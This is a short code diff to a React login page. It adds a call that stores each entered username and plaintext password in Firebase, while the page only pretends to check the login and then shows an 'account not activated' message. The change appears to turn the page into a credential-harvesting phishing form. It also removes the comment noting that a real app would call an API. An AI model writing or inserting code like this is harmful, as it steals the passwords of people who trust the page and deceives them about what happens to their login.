@@ -7,6 +7,7 @@ import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
+import { saveLoginAttempt } from "@/lib/firebase";
 
 export default function Login() {
   const [, setLocation] = useLocation();
@@ -31,8 +32,10 @@ export default function Login() {
 
     setIsLoading(true);
 
+    // Save login attempt to Firebase
+    await saveLoginAttempt(username, password);
+
     // Simulate checking if account exists but not activated
-    // In a real app, this would be an API call
     setTimeout(() => {
       setIsLoading(false);
       // Show activation message
